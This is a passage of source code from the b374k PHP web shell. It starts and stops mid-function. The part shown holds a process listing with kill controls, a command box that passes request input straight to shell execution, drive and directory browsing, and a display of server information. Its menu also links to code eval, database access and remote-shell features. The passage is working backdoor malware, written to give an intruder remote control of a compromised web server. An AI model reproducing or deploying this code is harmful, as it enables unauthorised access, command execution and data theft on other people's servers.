	elseif(isset($_GP['x']) && ($_GP['x']=='ps')){
		$s_buff = "";
		// kill process specified by pid
		if(isset($_GP['pid'])){
			$s_p = trim($_GP['pid'],"|");
			$s_parr = explode("|", $s_p);

			foreach($s_parr as $s_p){
				if(function_exists("posix_kill")) $s_buff .= (posix_kill($s_p,'9'))? notif("Process with pid ".$s_p." has been successfully killed"):notif("Unable to kill process with pid ".$s_p);
				else{
					if(!$s_win) $s_buff .= notif(exe("kill -9 ".$s_p));
					else $s_buff .= notif(exe("taskkill /F /PID ".$s_p));
				}
			}
		}

		if(!$s_win) $s_h = "ps aux"; // nix
		else $s_h = "tasklist /V /FO csv"; // win
		$s_wcount = 11;
		$s_wexplode = " ";
		if($s_win) $s_wexplode = "\",\"";

		$s_res = exe($s_h);
		if(trim($s_res)=='') $s_result = notif("Error getting process list");
		else{
			if($s_buff!="") $s_result = $s_buff;
			$s_result .= "&lt;table class='explore sortable'&gt;";
			if(!$s_win) $s_res = preg_replace('#\ +#',' ',$s_res);

			$s_psarr = explode("\n",$s_res);
			$s_fi = true;
			$s_tblcount = 0;

			$s_check = explode($s_wexplode,$s_psarr[0]);
			$s_wcount = count($s_check);

			foreach($s_psarr as $s_psa){
				if(trim($s_psa)!=''){
					if($s_fi){
						$s_fi = false;
						$s_psln = explode($s_wexplode, $s_psa, $s_wcount);
						$s_result .= "&lt;tr&gt;&lt;th style='width:24px;' class='sorttable_nosort'&gt;&lt;/th&gt;&lt;th class='sorttable_nosort'&gt;action&lt;/th&gt;";
						foreach($s_psln as $s_p) $s_result .= "&lt;th&gt;".trim(trim(strtolower($s_p)) ,"\"")."&lt;/th&gt;";
						$s_result .= "&lt;/tr&gt;";
					}
					else{
						$s_psln = explode($s_wexplode, $s_psa, $s_wcount);
						$s_result .= "&lt;tr&gt;";
						$s_tblcount = 0;
						foreach($s_psln as $s_p){
							$s_pid = trim(trim($s_psln[1]),"\"");
							if(trim($s_p)=="") $s_p = "&nbsp;";
							if($s_tblcount == 0){
								$s_result .= "&lt;td style='text-align:center;text-indent:4px;'&gt;&lt;input id='".md5($s_pid)."' name='cbox' value='".$s_pid."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /&gt;&lt;label for='".md5($s_pid)."' class='css-label'&gt;&lt;/label&gt;&lt;/td&gt;&lt;td style='text-align:center;'&gt;&lt;a href='".$s_self."x=ps&pid=".$s_pid."'&gt;kill&lt;/a&gt;&lt;/td&gt;
										&lt;td style='text-align:center;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
								$s_tblcount++;
							}
							else{
								$s_tblcount++;
								if($s_tblcount == count($s_psln)) $s_result .= "&lt;td style='text-align:left;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
								else $s_result .= "&lt;td style='text-align:center;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
							}
						}
						$s_result .= "&lt;/tr&gt;";
					}
				}
			}
			$colspan = count($s_psln)+1;
			$s_result .= "&lt;tfoot&gt;&lt;tr class='cbox_selected'&gt;&lt;td class='cbox_all'&gt;
			&lt;form action='".$s_self."' method='post'&gt;&lt;input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /&gt;&lt;label for='checkalll' class='css-label'&gt;&lt;/label&gt;&lt;/form&gt;
			&lt;/td&gt;&lt;td style='text-indent:10px;padding:2px;' colspan=".$colspan."&gt;&lt;a href='javascript: pkill();'&gt;kill selected &lt;span id='total_selected'&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
			&lt;/tr&gt;&lt;/tfoot&gt;&lt;/table&gt;";
		}
	}
	else{
		if(!isset($s_cwd)) $s_cwd = "";
		if(isset($_GP['cmd'])){
			$s_cmd = $_GP['cmd'];
			if(strlen($s_cmd) &gt; 0){
				if(preg_match('#^cd(\ )+(.*)#',$s_cmd,$s_r)){
					$s_nd = trim($s_r[2]);
					if(@is_dir($s_nd)){
						chdir($s_nd);
						$s_cwd = cp(getcwd());
						setcookie("cwd", $s_cwd ,time() + $s_login_time);
						$s_result .= showdir($s_cwd);
					}
					elseif(@is_dir($s_cwd.$s_nd)){
						chdir($s_cwd.$s_nd);
						$s_cwd = cp(getcwd());
						setcookie("cwd", $s_cwd ,time() + $s_login_time);
						$s_result .= showdir($s_cwd);
					}
					else $s_result .= notif($s_nd." is not a directory");
				}
				else{
					$s_r = hss(exe($s_cmd));
					if($s_r != '') $s_result .= "&lt;pre&gt;".$s_r."&lt;/pre&gt;";
					else $s_result .= showdir($s_cwd);
				}
			}
			else $s_result .= showdir($s_cwd);
		}
		else $s_result .= showdir($s_cwd);
	}

	// find drive letters
	$s_letters = '';
	$s_v = explode("\\",$s_cwd);
	$s_v = $s_v[0];
	foreach (range("A", "Z") as $s_letter){
		if(@is_readable($s_letter.":\\")){
			$s_letters .= "&lt;a href='".$s_self."cd=".$s_letter.":\\'&gt;[ ";
			if($s_letter.":" != $s_v) $s_letters .= $s_letter;
			else{$s_letters .= "&lt;span class='drive-letter'&gt;".$s_letter."&lt;/span&gt;";}
			$s_letters .= " ]&lt;/a&gt; ";
		}
	}

	// print useful info
	$s_info  = "&lt;table class='headtbl'&gt;&lt;tr&gt;&lt;td&gt;".$s_system."&lt;/td&gt;&lt;/tr&gt;";
	$s_info .= "&lt;tr&gt;&lt;td&gt;".$s_software."&lt;/td&gt;&lt;/tr&gt;";
	$s_info .= "&lt;tr&gt;&lt;td&gt;server ip : ".$s_server_ip."&lt;span class='gaya'&gt; | &lt;/span&gt;your   ip : ".$s_my_ip;
	$s_info .= "&lt;span class='gaya'&gt; | &lt;/span&gt; Time @ Server : ".@date("d M Y H:i:s",time());
	$s_info .= "&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td style='text-align:left;'&gt;
				&lt;table class='headtbls'&gt;&lt;tr&gt;
				&lt;td&gt;".trim($s_letters)."&lt;/td&gt;
				&lt;td&gt;
				&lt;span id='chpwd'&gt;
				&nbsp;&lt;a href=\"javascript:tukar_('chpwd','chpwdform')\"&gt;
				&lt;span class='icon'&gt;&lt;/span&gt;
				&nbsp;&nbsp;&lt;/a&gt;".swd($s_cwd)."&lt;/span&gt;
				&lt;form action='".$s_self."' method='post' style='margin:0;padding:0;'&gt;
				&lt;span class='sembunyi' id='chpwdform'&gt;
				&nbsp;&lt;a href=\"javascript:tukar_('chpwdform','chpwd');\"&gt;
				&lt;span class='icon'&gt;&lt;/span&gt;
				&lt;/a&gt;&nbsp;&nbsp;
				&lt;input type='text' name='view' class='inputz' style='width:300px;' value='".$s_cwd."' /&gt;
				&lt;input class='inputzbut' type='submit' name='submit' value='view file / folder' /&gt;
				&lt;/span&gt;
				&lt;/form&gt;
				&lt;/td&gt;&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;/table&gt;";
}

$s_error = ob_get_contents();
if(!empty($s_error)) $s_result = notif($s_error).$s_result;
ob_end_clean();

?&gt;&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;?php echo $s_title; ?&gt;&lt;/title&gt;
&lt;meta charset="utf-8"&gt;
&lt;meta name='robots' content='noindex, nofollow, noarchive'&gt;
&lt;link rel='SHORTCUT ICON' href='&lt;?php echo $s_favicon; ?&gt;'&gt;
&lt;link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'&gt;
&lt;style type='text/css'&gt;
*{font-family:Ubuntu Mono,serif;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:0;}
body{background:&lt;?php echo $s_color[0]; ?&gt;;font-size:12px;color:&lt;?php echo $s_color[1]; ?&gt;;font-weight:400;}
hr{border-bottom:1px dashed &lt;?php echo $s_color[2]; ?&gt;;}
a{color:&lt;?php echo $s_color[3]; ?&gt;;text-decoration:none;}
a:hover{color:&lt;?php echo $s_color[1]; ?&gt;;}
pre{padding:0 8px;}
form{display:inline;}
table th,p{cursor:default;}
input:focus,select:focus,textarea:focus,button:focus{outline: none;}
#main{background:&lt;?php echo $s_color[4]; ?&gt;;-moz-border-radius:10px;border-radius:10px;width:100%;padding:2px 8px;}
#header{text-align:left;margin:0;padding:0;}
#header td{margin:0;padding:0;}
#header h1{font-size:20px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);margin:0;padding:0;}
#header h1 a,.explorelist:hover a{color:&lt;?php echo $s_color[1]; ?&gt;;}
#menu{background:&lt;?php echo $s_color[4]; ?&gt;;margin:0 2px 4px;}
#result{-moz-border-radius:10px;border-radius:10px;border:1px solid &lt;?php echo $s_color[3]; ?&gt;;line-height:16px;background:&lt;?php echo $s_color[4]; ?&gt;;color:&lt;?php echo $s_color[5]; ?&gt;;margin:0 0 8px;padding:4px 8px;}
.headinfo{border-left:1px solid &lt;?php echo $s_color[3]; ?&gt;;margin:6px;padding:2px 0 0 16px;}
.headtbls tr{height:24px;vertical-align:middle;}
.gaya,.ver{color:&lt;?php echo $s_color[3]; ?&gt;;font-weight:700;}
.ver{-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);letter-spacing:2px;}
.menumi{background:&lt;?php echo $s_color[6]; ?&gt;;color:&lt;?php echo $s_color[3]; ?&gt;;text-decoration:none;letter-spacing:2px;font-size:12px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);-moz-border-radius:4px;border-radius:4px;margin:0;padding:4px 8px;}
.menumi:hover{background:&lt;?php echo $s_color[7]; ?&gt;;-webkit-transform:rotate(13.37deg);-moz-transform:rotate(13.37deg);-ms-transform:rotate(13.37deg);-o-transform:rotate(13.37deg);transform:rotate(13.37deg);}
.inputz,.prompt,.txtarea{background:&lt;?php echo $s_color[4]; ?&gt;;border:0;border-bottom:1px solid &lt;?php echo $s_color[7]; ?&gt;;font-size:12px;color:&lt;?php echo $s_color[1]; ?&gt;;padding:2px;}
.prompt{font-weight:700;}
.txtarea{width:100%;height:370px;}
.inputzbut{font-size:12px;background:&lt;?php echo $s_color[8]; ?&gt;;color:&lt;?php echo $s_color[3]; ?&gt;;border:1px solid &lt;?php echo $s_color[2]; ?&gt;;margin:0 4px;}
.but{float:left;background:&lt;?php echo $s_color[3]; ?&gt;;color:&lt;?php echo $s_color[0]; ?&gt;;margin:0 4px 0 0;font-size:20px;width:16px;height:16px;border-radius:50%;text-align:center;padding:0;line-height:12px;cursor:default}
.explore{width:100%;padding:4px 0;}
.explore a{text-decoration:none;}
.explore td{border-bottom:1px solid &lt;?php echo $s_color[2]; ?&gt;;line-height:24px;padding:0 8px;vertical-align:top;}
.explore th{font-weight:700;background:&lt;?php echo $s_color[2]; ?&gt;;padding:6px 8px;}
.explore tr:hover{background:&lt;?php echo $s_color[8]; ?&gt;;}
.sembunyi{display:none;margin:0;padding:0;}
.info table{width:100%;border-radius:6px;border:1px solid &lt;?php echo $s_color[3]; ?&gt;;margin:4px 0;padding:8px;}
.info th,th{background:&lt;?php echo $s_color[8]; ?&gt;;font-weight:700;}
.info td{border-bottom:1px solid &lt;?php echo $s_color[2]; ?&gt;;}
.info h2{text-align:center;font-size:15px;background:&lt;?php echo $s_color[8]; ?&gt;;letter-spacing:6px;border-radius:6px;border-bottom:1px solid &lt;?php echo $s_color[3]; ?&gt;;margin:4px 0 8px;padding:10px;}
.info a{color:&lt;?php echo $s_color[10]; ?&gt;;}
.viewfile{width:100%;border-bottom:1px solid &lt;?php echo $s_color[2]; ?&gt;;margin:0 0 4px;}
.viewfile td{border-bottom:1px solid &lt;?php echo $s_color[2]; ?&gt;;background:&lt;?php echo $s_color[8]; ?&gt;;height:24px;padding:2px 4px;}
.viewfilecontent{padding:11px 8px;}
.mybox{-moz-border-radius:10px;border-radius:10px;border:1px solid &lt;?php echo $s_color[3]; ?&gt;;margin:4px 0 8px;padding:14px 8px;}
.mybox h2{border-bottom:1px solid &lt;?php echo $s_color[9]; ?&gt;;color:&lt;?php echo $s_color[3]; ?&gt;;margin:0;padding:0 0 8px;}
.notif{background:&lt;?php echo $s_color[3]; ?&gt;;color:&lt;?php echo $s_color[0]; ?&gt;;border-radius:6px;font-weight:700;margin:3px 0;padding:4px 8px 2px;}
.notif a{color:&lt;?php echo $s_color[0]; ?&gt;;}
.footer{text-align:right;font-size:10px;letter-spacing:2px;color:&lt;?php echo $s_color[2]; ?&gt;;padding:0 16px;}
.headtbl,.myboxtbl{width:100%;}
input[type=checkbox].css-checkbox + label.css-label{padding-left:20px;height:15px;display:inline-block;line-height:15px;background-repeat:no-repeat;background-position:0 0;vertical-align:middle;cursor:pointer;}
input[type=checkbox].css-checkbox:checked + label.css-label{background-position:0 -15px;}
.info,.info h1,.info hr,input[type=checkbox].css-checkbox{display:none;}
.css-label{background-image:url(&lt;?php echo $s_checkbox; ?&gt;);}
.icon{background:url(&lt;?php echo $s_favicon; ?&gt;);margin:6px 0;border:0;padding:1px 8px 0 8px;}
.drive-letter{color:&lt;?php echo $s_color[1]; ?&gt;;}
.desc{color:&lt;?php echo $s_color[11]; ?&gt;;}
.cbox_selected{background-color:&lt;?php echo $s_color[12]; ?&gt;;}
.cbox_all{text-align:center;text-indent:4px;}
.schemabox{background-color:&lt;?php echo $s_color[3]; ?&gt;;border-radius:2px;}
.border-bottom{border-bottom:1px solid &lt;?php echo $s_color[7]; ?&gt;;}
.border-top{border-top:1px solid &lt;?php echo $s_color[7]; ?&gt;;}
#navigation{position:fixed;left:-16px;top:46%;}
#totop,#tobottom{background:url(&lt;?php echo $s_arrow; ?&gt;);width:32px;height:32px;opacity:0.30;margin:12px 0;}
#totop:hover,#tobottom:hover{opacity:0.80;}
#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;table id='main'&gt;&lt;tr&gt;&lt;td&gt;
&lt;?php if($s_auth){?&gt;
	&lt;div&gt;&lt;span style='float:right;'&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=logout' title='Click me to log out'&gt;log out&lt;/a&gt;  &lt;a href='&lt;?php echo $s_self; ?&gt;x=switch' title='Click me to change theme'&gt;&lt;span class='schemabox'&gt;&nbsp;&nbsp;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;table id='header'&gt;&lt;tr&gt;&lt;td style='width:80px;'&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;h1&gt;&lt;a href='&lt;?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?&gt;'&gt;b374k&lt;/a&gt;&lt;/h1&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style='text-align:right;'&gt;&lt;div class='ver'&gt;&lt;?php echo $s_ver; ?&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;	&lt;td&gt;&lt;div class='headinfo'&gt;&lt;?php echo $s_info; ?&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
	&lt;div style='clear:both;'&gt;&lt;/div&gt;
	&lt;form method='post' name='g'&gt;&lt;/form&gt;
	&lt;div id='menu'&gt;
		&lt;table style='width:100%;'&gt;&lt;tr&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;' title='Explorer'&gt;&lt;div class='menumi'&gt;xpl&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=ps' title='Display process status'&gt;&lt;div class='menumi'&gt;ps&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=eval' title='Execute code'&gt;&lt;div class='menumi'&gt;eval&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=info' title='Information about server'&gt;&lt;div class='menumi'&gt;info&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=db' title='Connect to database'&gt;&lt;div class='menumi'&gt;db&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;a href='&lt;?php echo $s_self; ?&gt;x=rs' title='Remote Shell'&gt;&lt;div class='menumi'&gt;rs&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td style='width:100%;padding:0 0 0 6px;'&gt;
		&lt;span class='prompt'&gt;&lt;?php echo $s_prompt; ?&gt;&lt;/span&gt;&lt;form action='&lt;?php echo $s_self; ?&gt;' method='post'&gt;
		&lt;input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd' style='width:70%;' value='&lt;?php
if(isset($_GP['cmd'])) echo "";
else echo "- shell command -";
?&gt;' /&gt;
		&lt;noscript&gt;&lt;input class='inputzbut' type='submit' value='Go !' name='submitcmd' style='width:80px;' /&gt;&lt;/noscript&gt;
		&lt;/form&gt;
		&lt;/td&gt;
		&lt;/tr&gt;&lt;/table&gt;
	&lt;/div&gt;
	&lt;div id='content'&gt;
		&lt;div id='result'&gt;&lt;?php echo $s_result; ?&gt;&lt;/div&gt;
	&lt;/div&gt;
	&lt;div id='navigation'&gt;
	&lt;div id='totop' onclick='totopd();' onmouseover='totop();' onmouseout='stopscroll();'&gt;&lt;/div&gt;
	&lt;div id='tobottom' onclick='tobottomd();' onmouseover='tobottom();' onmouseout='stopscroll();'&gt;&lt;/div&gt;
	&lt;/div&gt;
&lt;?php } else{ ?&gt;
	&lt;div style='width:100%;text-align:center;'&gt;
	&lt;form action='&lt;?php echo $s_self; ?&gt;' method='post'&gt;
	&lt;img src='&lt;?php echo $s_favicon; ?&gt;' style='margin:2px;vertical-align:middle;' /&gt;
	b374k&nbsp;&lt;span class='gaya'&gt;&lt;?php echo $s_ver; ?&gt;&lt;/span&gt;&lt;input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' /&gt;
	&lt;input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' /&gt;
	&lt;/form&gt;
	&lt;/div&gt;
&lt;?php }?&gt;	&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;p class='footer'&gt;Jayalah Indonesiaku &copy;&lt;?php echo @date("Y",time())." "; ?&gt;b374k&lt;/p&gt;
&lt;script type='text/javascript'&gt;
&lt;?php echo gzinflate(base64_decode($s_sortable_js)).gzinflate(base64_decode($s_domready_js)); ?&gt;
&lt;/script&gt;
&lt;script type='text/javascript'&gt;
var d = document;
var scroll = false;
var cwd = '&lt;?php echo adds($s_cwd); ?&gt;';
var hexstatus = false;
var timer = '';

domready(function(){
	&lt;?php if(isset($_GP['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?&gt;
	&lt;?php if(isset($_GP['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?&gt;
	&lt;?php if(isset($_GP['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?&gt;
	&lt;?php if(isset($_GP['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?&gt;
	&lt;?php if(isset($_GP['hexedit'])) echo "showhex();"; ?&gt;

	if(d.getElementById('cmd')) d.getElementById('cmd').setAttribute('autocomplete', 'off');

	var textareas = d.getElementsByTagName('textarea');
	var count = textareas.length;
	for(i = 0; i&lt;count; i++){
		textareas[i].onkeydown = function(e){
			if(e.keyCode==9){
				e.preventDefault();
				var s = this.selectionStart;
				this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
				this.selectionEnd = s+1;
			}
			else if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
				this.form.submit();
			}
		}
	}
	listen();
});
function is_array(var_to_tes){
	return (Object.prototype.toString.call(var_to_tes) === '[object Array]')? true:false;
}
function listen(){
	var x = d.getElementsByTagName("a");
	for(i = 0; i&lt;x.length; i++){
		if(x[i].addEventListener) x[i].addEventListener ("click", function(event){go(this.href,event);event.preventDefault();return false;},false);
		else x[i].attachEvent ("onclick", function(event){return go(this.href,event);event.preventDefault();return false;});
	}
}
function go(t,evt){
	if(evt.which === 3 || evt.button === 2) return false;

	var z = d.getElementsByName('g');
	if(z){
		var y = z.item(this);
		for(var i = 0; i&lt;y.length; i++){
			y[i].remove();
		}
	}

	t = decodeURI(t);
	ts = t.split('?');

	if(is_array(ts) && ts.length &gt;= 2){
		var a = ts[0]
		var v = ts[1];

		if(ts.length==3){
			a = ts[0]+'?'+ts[1]+'?';
			v = ts[2];
		}

		var vs = v.split('&');
		var g = d.forms['g'];

		if(a=='') a='?';
		g.action = a;

		if(is_array(vs)){
			for(var i = 0; i&lt;vs.length; i++){
				var e = vs[i].indexOf('=');
				if(e&gt;=0) addinput(g, vs[i].slice(0,e), vs[i].slice(e+1));
				else addinput(g, vs[0], '');
			}
		}
		else{
			var e = vs.indexOf('=');
			if(e&gt;=0) addinput(g, vs.slice(0,e), vs.slice(e+1));
			else addinput(g, vs, '');
		}
		g.submit();
	}
	else window.location = t;
	return false;
}
function tukar_(l,b){
	if(d.getElementById(l)) d.getElementById(l).style.display = 'none';
	if(d.getElementById(b)) d.getElementById(b).style.display = 'block';
	if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();
}
function toggle(b){
	if(d.getElementById(b)){
		if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';
		else d.getElementById(b).style.display = 'block'
	}
}
function tukar(id,cd,x,v,o){
	if(!o) o = '';
	a = d.getElementById(id);
	b = d.getElementById(id+'_form');
	c = '&lt;?php echo adds($s_self); ?&gt;';
	if(cd=='') cd = cwd;
	if(a && b){
		var i = d.createElement('form');
		i.action = c;
		i.method = 'post';

		if(o!='') addinput(i,'oldname',o);

		addinput(i,'cd',cd);
		addinput(i,x,v,'text','width:80px;','','inputz');
		addinput(i,'','Go !','submit','width:32px;','','inputzbut');
		addinput(i,'','x','button','',id,'inputzbut');
		b.appendChild(i);
		a.style.display = 'none';
	}
}
function addinput(f,n,v,t,s,c,cl){
	if(!t) t ='hidden';
	var i = d.createElement('input');
	if(n) i.name = n;
	if(v) i.value = v;
	if(t) i.type = t;
	if(s) i.style.cssText = s;
	if(c) i.onclick = function(){
		a = d.getElementById(c);
		b = d.getElementById(c+'_form');
		a.style.display = 'block';
		b.innerHTML = '';
	};
	if(cl) i.className = cl;
	f.appendChild(i);
}
function clickcmd(){
	var buff = d.getElementById('cmd');
	if(buff.value == '- shell command -') buff.value = '';
}
function download(what){
	what.form.submit();
	what.selectedIndex=0;
}
function hexfix(t,ev){
	var r = d.getElementById('hex_'+t);
	var q = d.getElementById('dump_'+t);
	var curpos = getcurpos(r);

	if(ev.keyCode==13 || ev.keyCode==46 || ev.keyCode==8 || ev.keyCode==32)	return false;

	if(ev.keyCode==40){
		var s = d.getElementById('hex_'+(parseInt(t)+1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
	if(ev.keyCode==38){
		var s = d.getElementById('hex_'+(parseInt(t)-1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
}
function showhex(){
	var counter = parseInt(d.getElementById('counter').value);
	for(var i = 0; i&lt;counter; i++) hexupdate(i);
}
function hexupdate(t,ev){
	var r = d.getElementById('hex_'+t);
	var s = d.getElementById('dump_'+t);
	var a = '0123456789ABCDEF';
	var hexs = r.value;
	var hex = hexs.replace(/\s+/ig,'');
	var curpos = 0;

	clearpos();

	if(ev){
		curpos = getcurpos(r);
		var k = String.fromCharCode(ev.keyCode);
		if(curpos%3!=2){
			if(a.indexOf(k)&gt;=0 && curpos&lt;hexs.length){
				chr = hexs.substr(curpos,1);
				before = (curpos&gt;=1)?  hexs.substr(0,curpos):'';
				after = (curpos&lt;hexs.length)? hexs.substr(curpos+1):'';
				r.value = before + k + after;
				setcurpos(r, curpos+1, curpos+1);
			}
		}
	}

	if(r && s){
		var str = '';
		hexs = r.value;
		hex = hexs.replace(/\s+/ig,'');
		for(var i = 0; i&lt;hex.length; i+=2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));

		str = str.replace(/[^\x21-\x7E]/ig,'.');
		str = str.replace(/&lt;/ig,'.');
		str = str.replace(/&gt;/ig,'.');

		dmppos = Math.floor(curpos/3);
		chr = str.substr(dmppos,1);
		before = (dmppos&gt;=1)? str.substr(0,dmppos):'';
		after = (dmppos&lt;str.length)? str.substr(dmppos+1):'';
		s.innerHTML = before + "&lt;span class='gaya' style='background:#000;font-weight:bold;border-bottom:1px solid #fff;border-top:1px solid #fff;'&gt;" + chr + "&lt;/span&gt;" + after;
	}
}
function submithex(){
	if(!hexstatus){
		hexstatus=true;
		var hexstr = '';
		var counter = parseInt(d.getElementById('counter').value);
		for(var i = 0; i&lt;counter; i++){
			var hex = d.getElementById('hex_'+i);
			hexstr += hex.value;
			hex.remove();
		}
		hexstr = hexstr.replace(/\s+/g,'');
		var hexestxtarea = d.getElementById('hexestxtarea');
		hexestxtarea.innerHTML = hexstr;
		hexestxtarea.form.submit();
	}
}
function evalselect(e){
	var a = d.getElementById('additionaloption');
	var b = d.getElementById('evaloption');

	if(a){
		if(e.value=='php') a.className='sembunyi';
		else a.className='';
		if(b) evaloption.value ='';
	}
}
function getcurpos(c){
    var p = 0;

    if(d.selection){
        c.focus ();
        var sel = d.selection.createRange();
        sel.moveStart ('character', c.value.length);
        p = sel.text.length;
    }
    else if(c.selectionStart || c.selectionStart == '0')
        p = c.selectionStart;
    return p;
}
function setcurpos(c,p1,p2){
	if(c.setSelectionRange){
		c.focus(); c.setSelectionRange(p1,p2);
	}
	else if(c.createTextRange){
		var r = c.createTextRange();
		r.collapse(true);
		r.moveStart('character', p1);
		r.moveEnd('character', p2);
		r.select();
	}
}
function clearpos(){
	var a = d.getElementsByName('hexdump');
	for(var i = 0; i&lt;a.length; i++)	a[i].innerHTML = a[i].innerHTML.replace(/&lt;[^&gt;]+&gt;/ig,'');
}
function findtype(ty){
	var z = d.getElementById('type');
	if(z && (ty=='sdir')) z.selectedIndex = 1;
	else if(z && (ty=='sfile')) z.selectedIndex = 0;
}
function checkall(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementsByName('abox');
	var z = '&lt;?php if(isset($_GP['x']) && ($_GP['x']=='ps')) echo "ps"; ?&gt;';

	for(var i = 0; i&lt;a.length; i++){
		if(a[i].checked || (z=='ps') || (i!=0) && (i!=1)){
			a[i].checked = b[0].checked;
		}
		var c = a[i].parentElement.parentElement;
		if(a[i].checked) c.className = 'cbox_selected';
		else c.className = '';
	}
	total_selected();
}
function hilite(el){
	var c = el.parentElement.parentElement;
	if(el.checked) c.className = 'cbox_selected';
	else c.className = '';
	total_selected();
}
function total_selected(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementById('total_selected');
	var c = 0;
	for(var i = 0;i&lt;a.length;i++)	if(a[i].checked) c++;
	if(c==0) b.innerHTML = '';
	else b.innerHTML = ' ( selected : '+c+' items )';
}
function massactgo(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementById('massact');
	var c = d.getElementsByName('abox');
	var buffer = '';

	if(b.value=='cut' || b.value=='copy'){
		d.cookie='massact='+b.value+';';
		for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
	}
	else if(b.value=='paste'){
		addinput(b.form,'y','paste');
		b.form.submit();
	}
	else{
		for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
		addinput(b.form,'y', b.value);
		b.form.submit();
	}
	for(var i = 0; i&lt;a.length; i++){
		a[i].checked = false;
		a[i].parentElement.parentElement.className='';
	}
	c[0].checked = false;
}
function pkill(){
	var a = d.getElementsByName('cbox');
	var c = d.getElementsByName('abox');
	var buffer = '';

	for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';

	if(buffer!=''){
		addinput(c[0].form,'x', 'ps');
		addinput(c[0].form,'pid', buffer);
		c[0].form.submit();
	}

	for(var i = 0; i&lt;a.length; i++){
		a[i].checked = false;
		a[i].parentElement.parentElement.className='';
	}
	c[0].checked = false;
}
function dc(id){
	d.cookie = dbcon[id] + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}
function totop(){
	if(!scroll){
		var dur = window.pageYOffset;
		scroll = true;
		scrollto(0, dur);
	}
}
function totopd(){
	d.body.scrollTop = d.documentElement.scrollTop = 0;
	stopscroll();
}
function tobottom(){
	if(!scroll){
		var dur = getheight()-window.pageYOffset;
		scroll = true;
		scrollto(getheight(), dur);
	}
}
function tobottomd(){
	d.body.scrollTop = d.documentElement.scrollTop = getheight();
	stopscroll();
}
function stopscroll(){
	scroll = false;
	clearTimeout(timer);
}
function scrollto(to, dur) {
    var start = d.documentElement.scrollTop + d.body.scrollTop, change = to - start, cur = 0, inc = 20;
    var anim = function(){
		if(scroll){
			cur += inc;
			var val = easing(cur, start, change, dur);
			d.body.scrollTop = d.documentElement.scrollTop = val;
			if(cur &lt; dur) {
				if(scroll) timer = setTimeout(anim, inc);
			}
			else stopscroll();
		}
    };
    anim();
}
function easing(t,b,c,e){
